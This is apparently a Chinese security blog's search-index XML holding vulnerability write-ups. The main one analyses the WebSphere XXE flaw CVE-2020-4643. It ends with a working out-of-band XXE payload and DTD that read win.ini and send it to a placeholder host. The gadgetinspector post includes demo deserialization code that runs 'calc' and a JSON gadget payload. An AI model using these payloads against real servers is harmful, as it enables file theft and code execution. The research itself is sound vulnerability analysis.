<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[WebSphere XXE 漏洞分析(CVE-2020-4643)]]></title>
    <url>%2FWebSphere%20XXE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-4643).html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。 WebSphere XXE漏洞分析(CVE-2020-4643)作者：Longofo@知道创宇404实验室 &amp; r00t4dm@奇安信A-TEAM 时间：2020年9月21日 2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。 补丁先来看看补丁，只能看出是修复了一个XXE，不知道是哪儿的XXE： 可以看出这里是修复了一个XXE漏洞，但是这只是一个Utils，我们找到的那个XXE刚好也用了这个Utils。 漏洞分析最开始研究WebSphere就是前不久的CVE-2020-4450，这个漏洞外面已经有分析了。为了更熟悉一点WebSphere，我们也去研究了历史补丁，例如印象比较深的就是前不久的CVE-2020-4276，这个漏洞算是历史漏洞CVE-2015-7450的认证方式绕过，RCE的过程与CVE-2015-7450没区别。后面意外的找到另一个反序列化入口，在确认了已经无法在历史漏洞上做文章的时，只好从readObject、readExternal、toString、compare等函数去尝试找下了，后来在一个readObject找到一个能JNDI注入的地方，但是由于sdk高版本的原因，能利用的方式就只能是本地factory或利用jndi本地反序列化了，但是WebSphere公开的利用链都被堵上了，本地反序列化其实没什么作用在这里，所以只剩下看本地Factory了。反序列化入口暂时先不给出，可能这样的反序列化入口还有很多，我们碰巧遇到了其中一个，如果后面有幸找到了RCE漏洞，就把我们找到的入口写出来，下面从那个readObject中的JNDI开始吧。 在com.ibm.ws.ejb.portable.EJBMetaDataImpl#readObject中： 123456789101112131415161718192021222324252627private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; try &#123; in.defaultReadObject(); ... ... this.ivStatelessSession = in.readBoolean(); ClassLoader loader = (ClassLoader)AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return Thread.currentThread().getContextClassLoader(); &#125; &#125;); this.ivBeanClassName = in.readUTF(); this.ivHomeClass = loader.loadClass(in.readUTF()); this.ivRemoteClass = loader.loadClass(in.readUTF()); if (!this.ivSession) &#123; this.ivPKClass = loader.loadClass(in.readUTF()); &#125; this.ivHomeHandle = (HomeHandle)in.readObject(); EJBHome ejbHomeStub = this.ivHomeHandle.getEJBHome();//ivHomeHandle是一个接口，我们找到了HomeHandleImpl，里面进行了JNDI查询，并且url可控 this.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ejbHomeStub, this.ivHomeClass);//如果跟踪过CVE-2020-4450就能感觉到，这里十分类似CVE-2020-4450，不过缺少了后续的调用，无法像CVE-2020-4450利用WSIF的方式触发后续的RCE，WSIF之前那个XXE也被修复了 &#125; catch (IOException var6) &#123; throw var6; &#125; catch (ClassNotFoundException var7) &#123; throw var7; &#125; &#125; com.ibm.ws.ejb.portable.HomeHandleImpl#getEJBHome如下： 1234567891011121314151617181920212223242526272829public EJBHome getEJBHome() throws RemoteException &#123; if (this.ivEjbHome == null) &#123; NoSuchObjectException re; ... ... InitialContext ctx; try &#123; if (this.ivInitialContextProperties == null) &#123; ctx = new InitialContext(); &#125; else &#123; try &#123; ctx = new InitialContext(this.ivInitialContextProperties); &#125; catch (NamingException var5) &#123; ctx = new InitialContext(); &#125; &#125; this.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.ivJndiName), homeClass);//进行了JNDI查询，ivJndiName是属性，很容易控制 &#125; catch (NoInitialContextException var6) &#123; Properties p = new Properties(); p.put("java.naming.factory.initial", "com.ibm.websphere.naming.WsnInitialContextFactory"); ctx = new InitialContext(p); this.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.ivJndiName), homeClass); &#125; ... ... return this.ivEjbHome; &#125; 如果是sdk低版本，直接就是外部加载factory rce利用了，但是天不随人愿，如果这么容易就不会有CVE-2020-4450那种复杂的利用了。 接下来就只能一个一个看本地的factory了，也不多大概几十个，一个一个看吧。在com.ibm.ws.webservices.engine.client.ServiceFactory#getObjectInstance中，找到了那个XXE： 123456789101112131415161718192021222324252627282930313233343536public Object getObjectInstance(Object refObject, Name name, Context nameCtx, Hashtable environment) throws Exception &#123; Object instance = null; if (refObject instanceof Reference) &#123; Reference ref = (Reference)refObject; RefAddr addr = ref.get("service classname"); Object obj = null; if (addr != null &amp;&amp; (obj = addr.getContent()) instanceof String) &#123; instance = ClassUtils.forName((String)obj).newInstance(); &#125; else &#123; addr = ref.get("WSDL location"); if (addr != null &amp;&amp; (obj = addr.getContent()) instanceof String) &#123; URL wsdlLocation = new URL((String)obj); addr = ref.get("service namespace"); if (addr != null &amp;&amp; (obj = addr.getContent()) instanceof String) &#123; String namespace = (String)obj; addr = ref.get("service local part"); if (addr != null &amp;&amp; (obj = addr.getContent()) instanceof String) &#123; String localPart = (String)obj; QName serviceName = QNameTable.createQName(namespace, localPart); Class[] formalArgs = new Class[]&#123;URL.class, QName.class&#125;; Object[] actualArgs = new Object[]&#123;wsdlLocation, serviceName&#125;; Constructor ctor = Service.class.getDeclaredConstructor(formalArgs); instance = ctor.newInstance(actualArgs);//调用了Service构造函数 &#125; &#125; &#125; &#125; addr = ref.get("maintain session"); if (addr != null &amp;&amp; instance instanceof Service) &#123; ((Service)instance).setMaintainSession(true); &#125; &#125; return instance; &#125; com.ibm.ws.webservices.engine.client.Service#Service(java.net.URL, javax.xml.namespace.QName)，在构造函数中： 1234567891011121314151617181920212223242526272829303132333435363738public Service(URL wsdlLocation, QName serviceName) throws ServiceException &#123; if (log.isDebugEnabled()) &#123; log.debug("Entry Service(URL, QName) " + serviceName.toString()); &#125; this.serviceName = serviceName; this.wsdlLocation = wsdlLocation; Definition def = cachingWSDL ? (Definition)cachedWSDL.get(wsdlLocation.toString()) : null; if (def == null) &#123; Document doc = null; try &#123; doc = XMLUtils.newDocument(wsdlLocation.toString());//wsdlLocation外部可控，这里XMLUtils.newDocument进去就请求了wsdlLocation获取xml文件并解析 &#125; catch (Exception var8) &#123; FFDCFilter.processException(var8, "com.ibm.ws.webservices.engine.client.Service.initService", "199", this); throw new ServiceException(Messages.getMessage("wsdlError00", "", "\n" + var8)); &#125; try &#123; WSDLFactory factory = new WSDLFactoryImpl(); WSDLReader reader = factory.newWSDLReader(); reader.setFeature("javax.wsdl.verbose", false); def = reader.readWSDL(wsdlLocation.toString(), doc);//一开始我们只停留在了上面那个XMLUtils.newDocument，利用那儿的异常带不出去数据，由于是高版本sdk，外带也只能带一行数据。后来看到reader.readWSDL进去还能利用另一种方式外带全部数据 if (cachingWSDL) &#123; cachedWSDL.put(wsdlLocation.toString(), def); &#125; &#125; catch (Exception var7) &#123; FFDCFilter.processException(var7, "com.ibm.ws.webservices.engine.client.Service.initService", "293", this); throw new ServiceException(Messages.getMessage("wsdlError00", "", "\n" + var7)); &#125; &#125; this.initService(def); if (log.isDebugEnabled()) &#123; log.debug("Exit Service(URL, QName) "); &#125; &#125; com.ibm.wsdl.xml.WSDLReaderImpl#readWSDL(java.lang.String, org.w3c.dom.Document)之后，会调用到一个com.ibm.wsdl.xml.WSDLReaderImpl#parseDefinitions： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667protected Definition parseDefinitions(String documentBaseURI, Element defEl, Map importedDefs) throws WSDLException &#123; checkElementName(defEl, Constants.Q_ELEM_DEFINITIONS); WSDLFactory factory = this.getWSDLFactory(); Definition def = factory.newDefinition(); if (this.extReg != null) &#123; def.setExtensionRegistry(this.extReg); &#125; String name = DOMUtils.getAttribute(defEl, "name"); String targetNamespace = DOMUtils.getAttribute(defEl, "targetNamespace"); NamedNodeMap attrs = defEl.getAttributes(); if (importedDefs == null) &#123; importedDefs = new Hashtable(); &#125; if (documentBaseURI != null) &#123; def.setDocumentBaseURI(documentBaseURI); ((Map)importedDefs).put(documentBaseURI, def); &#125; if (name != null) &#123; def.setQName(new QName(targetNamespace, name)); &#125; if (targetNamespace != null) &#123; def.setTargetNamespace(targetNamespace); &#125; int size = attrs.getLength(); for(int i = 0; i &lt; size; ++i) &#123; Attr attr = (Attr)attrs.item(i); String namespaceURI = attr.getNamespaceURI(); String localPart = attr.getLocalName(); String value = attr.getValue(); if (namespaceURI != null &amp;&amp; namespaceURI.equals("http://www.w3.org/2000/xmlns/")) &#123; if (localPart != null &amp;&amp; !localPart.equals("xmlns")) &#123; def.addNamespace(localPart, value); &#125; else &#123; def.addNamespace((String)null, value); &#125; &#125; &#125; for(Element tempEl = DOMUtils.getFirstChildElement(defEl); tempEl != null; tempEl = DOMUtils.getNextSiblingElement(tempEl)) &#123; if (QNameUtils.matches(Constants.Q_ELEM_IMPORT, tempEl)) &#123; def.addImport(this.parseImport(tempEl, def, (Map)importedDefs)); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_DOCUMENTATION, tempEl)) &#123; def.setDocumentationElement(tempEl); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_TYPES, tempEl)) &#123; def.setTypes(this.parseTypes(tempEl, def)); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_MESSAGE, tempEl)) &#123; def.addMessage(this.parseMessage(tempEl, def)); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_PORT_TYPE, tempEl)) &#123; def.addPortType(this.parsePortType(tempEl, def)); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_BINDING, tempEl)) &#123; def.addBinding(this.parseBinding(tempEl, def)); &#125; else if (QNameUtils.matches(Constants.Q_ELEM_SERVICE, tempEl)) &#123; def.addService(this.parseService(tempEl, def)); &#125; else &#123; def.addExtensibilityElement(this.parseExtensibilityElement(Definition.class, tempEl, def)); &#125; &#125; this.parseExtensibilityAttributes(defEl, Definition.class, def, def); return def;&#125; com.ibm.wsdl.xml.WSDLReaderImpl#parseImport: 123456789101112131415161718192021222324252627282930313233343536protected Import parseImport(Element importEl, Definition def, Map importedDefs) throws WSDLException &#123; Import importDef = def.createImport(); String locationURI; try &#123; String namespaceURI = DOMUtils.getAttribute(importEl, "namespace"); locationURI = DOMUtils.getAttribute(importEl, "location");//获取location属性 String contextURI = null; if (namespaceURI != null) &#123; importDef.setNamespaceURI(namespaceURI); &#125; if (locationURI != null) &#123; importDef.setLocationURI(locationURI); if (this.importDocuments) &#123; try &#123; contextURI = def.getDocumentBaseURI(); Definition importedDef = null; InputStream inputStream = null; InputSource inputSource = null; URL url = null; if (this.loc != null) &#123; inputSource = this.loc.getImportInputSource(contextURI, locationURI); String liu = this.loc.getLatestImportURI(); importedDef = (Definition)importedDefs.get(liu); if (inputSource.getSystemId() == null) &#123; inputSource.setSystemId(liu); &#125; &#125; else &#123; URL contextURL = contextURI != null ? StringUtils.getURL((URL)null, contextURI) : null; url = StringUtils.getURL(contextURL, locationURI); importedDef = (Definition)importedDefs.get(url.toString()); if (importedDef == null) &#123; inputStream = StringUtils.getContentAsInputStream(url);//进行了请求，可以通过这个请求将数据外带，但是还是有些限制，例如有&amp;或"等字符的文件会报错导致带不了 ... ... xml payload: 123456789101112xml如下：&lt;!DOCTYPE x [ &lt;!ENTITY % aaa SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; &lt;!ENTITY % bbb SYSTEM &quot;http://yourip:8000/xx.dtd&quot;&gt; %bbb;]&gt;&lt;definitions name=&quot;HelloService&quot; xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt; &amp;ddd;&lt;/definitions&gt;xx.dtd如下：&lt;!ENTITY % ccc &apos;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=&quot;uri&quot; location=&quot;http://yourip:8000/xxeLog?%aaa;&quot;/&gt;&amp;#39;&gt;&apos;&gt;%ccc; 最后我们只看了浮在表面上的一些地方，人工最多只看了两层调用，也许RCE隐藏在更深的地方或者知识盲点现在没找到呢，还是得有个属于自己的能查找链的工具，工具不会累，人会。]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析]]></title>
    <url>%2FWebsphere%20IIOP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-4450)%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 已经有人先发了分析，就不再发了]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902)]]></title>
    <url>%2FF5%20BIG-IP%20hsqldb%E8%B8%A9%E5%9D%91%E5%88%86%E6%9E%90(CVE-2020-5902).html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 已发布到paper.seebug，https://paper.seebug.org/1271/]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化工具gadgetinspector原理初窥]]></title>
    <url>%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7gadgetinspector%E5%8E%9F%E7%90%86%E5%88%9D%E7%AA%A5.html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 记录下自己初步研究gadgetinspector这个工具的一些东西吧 Java反序列化工具gadgetinspector初窥作者：Longofo 时间：2019年9月4日 起因一开始是听@Badcode师傅说的这个工具，在Black Hat 2018的一个议题提出来的。这是一个基于字节码静态分析的、利用已知技巧自动查找从source到sink的反序列化利用链工具。看了几遍作者在Black Hat上的演讲视频与PPT，想从作者的演讲与PPT中获取更多关于这个工具的原理性的东西，可是有些地方真的很费解。不过作者开源了这个工具，但没有给出详细的说明文档，对这个工具的分析文章也很少，看到一篇平安集团对这个工具的分析，从文中描述来看，他们对这个工具应该有一定的认识并做了一些改进，但是在文章中对某些细节没有做过多的阐释。后面尝试了调试这个工具，大致理清了这个工具的工作原理，下面是对这个工具的分析过程，以及对未来工作与改进的设想。 关于这个工具 这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。 这个工具是在整个应用的classpath中寻找利用链。 这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。 这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。 这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。 这个工具不会生成能直接利用的Payload，具体的利用构造还需要人工参与。 序列化与反序列化序列化（Serialization）是将对象的状态信息转化为可以存储或者传输形式的过程，转化后的信息可以存储在磁盘上，在网络传输过程中，可以是字节、XML、JSON等格式；而将字节、XML、JSON等格式的信息还原成对象这个相反的过程称为反序列化。 在JAVA中，对象的序列化和反序列化被广泛的应用到RMI（远程方法调用）及网络传输中。 Java中的序列化与反序列化库 JDK(ObjectInputStream) XStream(XML,JSON) Jackson(XML,JSON) Genson(JSON) JSON-IO(JSON) FlexSON(JSON) Fastjson(JSON) … 不同的反序列化库在反序列化不同的类时有不同的行为、被反序列化类的不同”魔术方法”会被自动调用，这些被自动调用的方法就能够作为反序列化的入口点(source)。如果这些被自动调用的方法又调用了其他子方法，那么在调用链中某一个子方法也可以作为source，就相当于已知了调用链的前部分，从某个子方法开始寻找不同的分支。通过方法的层层调用，可能到达某些危险的方法(sink)。 ObjectInputStream 例如某个类实现了Serializable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readObject、readResolve等方法并调用。 例如某个类实现了Externalizable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readExternal等方法并调用。 Jackson ObjectMapper.readValue在反序列化类得到其对象时，会自动查找反序列化类的无参构造方法、包含一个基础类型参数的构造方法、属性的setter、属性的getter等方法并调用。 … 在后面的分析中，都使用JDK自带的ObjectInputStream作为样例。 控制数据类型=&gt;控制代码作者说，在反序列化漏洞中，如果控制了数据类型，我们就控制了代码。这是什么意思呢？按我的理解，写了下面的一个例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class TestDeserialization &#123; interface Animal &#123; public void eat(); &#125; public static class Cat implements Animal,Serializable &#123; @Override public void eat() &#123; System.out.println("cat eat fish"); &#125; &#125; public static class Dog implements Animal,Serializable &#123; @Override public void eat() &#123; try &#123; Runtime.getRuntime().exec("calc"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println("dog eat bone"); &#125; &#125; public static class Person implements Serializable &#123; private Animal pet; public Person(Animal pet)&#123; this.pet = pet; &#125; private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; pet = (Animal) stream.readObject(); pet.eat(); &#125; &#125; public static void GeneratePayload(Object instance, String file) throws Exception &#123; //将构造好的payload序列化后写入文件中 File f = new File(file); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(instance); out.flush(); out.close(); &#125; public static void payloadTest(String file) throws Exception &#123; //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); Object obj = in.readObject(); System.out.println(obj); in.close(); &#125; public static void main(String[] args) throws Exception &#123; Animal animal = new Dog(); Person person = new Person(animal); GeneratePayload(person,"test.ser"); payloadTest("test.ser"); // Animal animal = new Cat();// Person person = new Person(animal);// GeneratePayload(person,"test.ser");// payloadTest("test.ser"); &#125;&#125; 为了方便我把所有类写在一个类中进行测试。在Person中类中，有一个Animal类的属性pet，它是Cat和Dog的接口。在序列化时，我们能够控制Persion的pet具体是Cat对象或者Dog对象，因此在反序列化时，在readObject中pet.eat()具体的走向就不一样了。如果是pet是Cat类对象，就不会走到执行有害代码Runtime.getRuntime().exec(&quot;calc&quot;);这一步，但是如果pet是Dog类的对象，就会走到有害代码。 即使有时候类属性在声明时已经为它赋值了某个具体的对象，但是在Java中通过反射等方式依然能修改。如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class TestDeserialization &#123; interface Animal &#123; public void eat(); &#125; public static class Cat implements Animal, Serializable &#123; @Override public void eat() &#123; System.out.println(&quot;cat eat fish&quot;); &#125; &#125; public static class Dog implements Animal, Serializable &#123; @Override public void eat() &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;dog eat bone&quot;); &#125; &#125; public static class Person implements Serializable &#123; private Animal pet = new Cat(); private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; pet = (Animal) stream.readObject(); pet.eat(); &#125; &#125; public static void GeneratePayload(Object instance, String file) throws Exception &#123; //将构造好的payload序列化后写入文件中 File f = new File(file); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(instance); out.flush(); out.close(); &#125; public static void payloadTest(String file) throws Exception &#123; //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); Object obj = in.readObject(); System.out.println(obj); in.close(); &#125; public static void main(String[] args) throws Exception &#123; Animal animal = new Dog(); Person person = new Person(); //通过反射修改私有属性 Field field = person.getClass().getDeclaredField(&quot;pet&quot;); field.setAccessible(true); field.set(person, animal); GeneratePayload(person, &quot;test.ser&quot;); payloadTest(&quot;test.ser&quot;); &#125;&#125; 在Person类中，不能通过构造器或setter方法或其他方式对pet赋值，属性在声明时已经被定义为Cat类的对象，但是通过反射能将pet修改为Dog类的对象，因此在反序列化时依然会走到有害代码处。 这只是我自己对作者：”控制了数据类型，就控制了代码”的理解，在Java反序列化漏洞中，很多时候是利用到了Java的多态特性来控制代码走向最后达到恶意执行目的。 魔术方法在上面的例子中，能看到在反序列化时没有调用Person的readobject方法，它是ObjectInputStream在反序列化对象时自动调用的。作者将在反序列化中会自动调用的方法称为”魔术方法”。 使用ObjectInputStream反序列化时几个常见的魔术方法： Object.readObject() Object.readResolve() Object.finalize() … 一些可序列化的JDK类实现了上面这些方法并且还自动调用了其他方法（可以作为已知的入口点）： HashMap Object.hashCode() Object.equals() PriorityQueue Comparator.compare() Comparable.CompareTo() … 一些sink： Runtime.exec()，这种最为简单直接，即直接在目标环境中执行命令 Method.invoke()，这种需要适当地选择方法和参数，通过反射执行Java方法 RMI/JNDI/JRMP等，通过引用远程对象，间接实现任意代码执行的效果 … 作者给出了一个从Magic Methods(source)-&gt;Gadget Chains-&gt;Runtime.exec(sink)的例子： 上面的HashMap实现了readObject这个”魔术方法”，并且调用了hashCode方法。某些类为了比较对象之间是否相等会实现equals方法（一般是equals和hashCode方法同时实现）。从图中可以看到AbstractTableModel$ff19274a正好实现了hashCode方法，其中又调用了f.invoke方法，f是IFn对象，并且f能通过属性__clojureFnMap获取到。IFn是一个接口，上面说到，如果控制了数据类型，就控制了代码走向。所以如果我们在序列化时，在__clojureFnMap放置IFn接口的实现类FnCompose的一个对象，那么就能控制f.invoke走FnCompose.invoke方法，接着控制FnCompose.invoke中的f1、f2为FnConstant就能到达FnEval.invoke了（关于AbstractTableModel$ff19274a.hashcode中的f.invoke具体选择IFn的哪个实现类，根据后面对这个工具的测试以及对决策原理的分析，广度优先会选择短的路径，也就是选择了FnEval.invoke，所以这也是为什么要人为参与，在后面的样例分析中也可以看到）。 有了这条链，只需要找到触发这个链的漏洞点就行了。Payload使用JSON格式表示如下： 12345678910111213141516&#123; "@class":"java.util.HashMap", "members":[ 2, &#123; "@class":"AbstractTableModel$ff19274a", "__clojureFnMap":&#123; "hashcode":&#123; "@class":"FnCompose", "f1":&#123;"@class","FnConstant",value:"calc"&#125;, "f2":&#123;"@class":"FnEval"&#125; &#125; &#125; &#125; ]&#125; gadgetinspector工作流程如作者所说，正好使用了五个步骤： 1234567891011121314151617181920212223242526272829303132333435// 枚举全部类以及类的所有方法if (!Files.exists(Paths.get("classes.dat")) || !Files.exists(Paths.get("methods.dat")) || !Files.exists(Paths.get("inheritanceMap.dat"))) &#123; LOGGER.info("Running method discovery..."); MethodDiscovery methodDiscovery = new MethodDiscovery(); methodDiscovery.discover(classResourceEnumerator); methodDiscovery.save();&#125;//生成passthrough数据流if (!Files.exists(Paths.get("passthrough.dat"))) &#123; LOGGER.info("Analyzing methods for passthrough dataflow..."); PassthroughDiscovery passthroughDiscovery = new PassthroughDiscovery(); passthroughDiscovery.discover(classResourceEnumerator, config); passthroughDiscovery.save();&#125;//生成passthrough调用图if (!Files.exists(Paths.get("callgraph.dat"))) &#123; LOGGER.info("Analyzing methods in order to build a call graph..."); CallGraphDiscovery callGraphDiscovery = new CallGraphDiscovery(); callGraphDiscovery.discover(classResourceEnumerator, config); callGraphDiscovery.save();&#125;//搜索可用的sourceif (!Files.exists(Paths.get("sources.dat"))) &#123; LOGGER.info("Discovering gadget chain source methods..."); SourceDiscovery sourceDiscovery = config.getSourceDiscovery(); sourceDiscovery.discover(); sourceDiscovery.save();&#125;//搜索生成调用链&#123; LOGGER.info("Searching call graph for gadget chains..."); GadgetChainDiscovery gadgetChainDiscovery = new GadgetChainDiscovery(config); gadgetChainDiscovery.discover();&#125; Step1 枚举全部类以及每个类的所有方法要进行调用链的搜索，首先得有所有类及所有类方法的相关信息： 12345678910111213141516171819202122232425262728293031323334public class MethodDiscovery &#123; private static final Logger LOGGER = LoggerFactory.getLogger(MethodDiscovery.class); private final List&lt;ClassReference&gt; discoveredClasses = new ArrayList&lt;&gt;();//保存所有类信息 private final List&lt;MethodReference&gt; discoveredMethods = new ArrayList&lt;&gt;();//保存所有方法信息 ... ... public void discover(final ClassResourceEnumerator classResourceEnumerator) throws Exception &#123; //classResourceEnumerator.getAllClasses()获取了运行时的所有类(JDK rt.jar)以及要搜索应用中的所有类 for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; cr.accept(new MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);//通过ASM框架操作字节码并将类信息保存到this.discoveredClasses，将方法信息保存到discoveredMethods &#125; catch (Exception e) &#123; LOGGER.error("Exception analyzing: " + classResource.getName(), e); &#125; &#125; &#125; &#125; ... ... public void save() throws IOException &#123; DataLoader.saveData(Paths.get("classes.dat"), new ClassReference.Factory(), discoveredClasses);//将类信息保存到classes.dat DataLoader.saveData(Paths.get("methods.dat"), new MethodReference.Factory(), discoveredMethods);//将方法信息保存到methods.dat Map&lt;ClassReference.Handle, ClassReference&gt; classMap = new HashMap&lt;&gt;(); for (ClassReference clazz : discoveredClasses) &#123; classMap.put(clazz.getHandle(), clazz); &#125; InheritanceDeriver.derive(classMap).save();//查找所有继承关系并保存 &#125;&#125; 来看下classes.dat、methods.dat分别长什么样子： classes.dat 找了两个比较有特征的 类名 父类名 所有接口 是否是接口 成员 com/sun/deploy/jardiff/JarDiffPatcher java/lang/Object com/sun/deploy/jardiff/JarDiffConstants,com/sun/deploy/jardiff/Patcher false newBytes!2![B com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable false stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl 第一个类com/sun/deploy/jardiff/JarDiffPatcher： 和上面的表格信息对应一下，是吻合的 类名：com/sun/deploy/jardiff/JarDiffPatcher 父类： java/lang/Object，如果一类没有显式继承其他类，默认隐式继承java/lang/Object，并且java中不允许多继承，所以每个类只有一个父类 所有接口：com/sun/deploy/jardiff/JarDiffConstants、com/sun/deploy/jardiff/Patcher 是否是接口：false 成员：newBytes!2![B，newBytes成员，Byte类型。为什么没有将static/final类型的成员加进去呢？这里还没有研究如何操作字节码，所以作者这里的判断实现部分暂且跳过。不过猜测应该是这种类型的变量并不能成为污点所以忽略了 第二个类com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl： 和上面的表格信息对应一下，也是吻合的 类名：com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl，是一个内部类 父类： com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl 所有接口：com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable 是否是接口：false 成员：stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl，!*!这里可以暂时理解为分割符，有一个成员stub，类型com/sun/corba/se/spi/presentation/rmi/DynamicStub。因为是内部类，所以多了个this成员，这个this指向的是外部类 methods.dat 同样找几个比较有特征的 类名 方法名 方法描述信息 是否是静态方法 sun/nio/cs/ext/Big5 newEncoder ()Ljava/nio/charset/CharsetEncoder; false sun/nio/cs/ext/Big5_HKSCS$Decoder (Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V false sun/nio/cs/ext/Big5#newEncoder： 类名：sun/nio/cs/ext/Big5 方法名： newEncoder 方法描述信息： ()Ljava/nio/charset/CharsetEncoder; 无参，返回java/nio/charset/CharsetEncoder对象 是否是静态方法：false sun/nio/cs/ext/Big5_HKSCS$Decoder#： 类名：sun/nio/cs/ext/Big5_HKSCS$Decoder 方法名： 方法描述信息： (Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V 参数1是java/nio/charset/Charset类型，参数2是sun/nio/cs/ext/Big5_HKSCS$1类型，返回值void 是否是静态方法：false 继承关系的生成 继承关系在后面用来判断一个类是否能被某个库序列化、以及搜索子类方法实现等会用到。 12345678910111213141516171819202122232425262728293031323334353637383940414243public class InheritanceDeriver &#123; private static final Logger LOGGER = LoggerFactory.getLogger(InheritanceDeriver.class); public static InheritanceMap derive(Map&lt;ClassReference.Handle, ClassReference&gt; classMap) &#123; 